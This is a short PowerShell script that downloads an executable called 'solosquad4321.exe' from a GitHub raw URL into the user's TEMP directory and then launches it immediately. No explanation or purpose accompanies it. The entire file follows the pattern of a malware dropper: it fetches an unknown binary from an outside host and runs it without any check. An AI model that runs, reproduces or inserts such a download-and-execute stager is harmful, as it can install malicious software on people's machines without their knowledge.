$url = "https://github.com/armandolionel/sokamoka1/raw/refs/heads/main/solosquad4321.exe"
$output = "$env:TEMP\solosquad4321.exe"

Invoke-WebRequest -Uri $url -OutFile $output
Start-Process $output
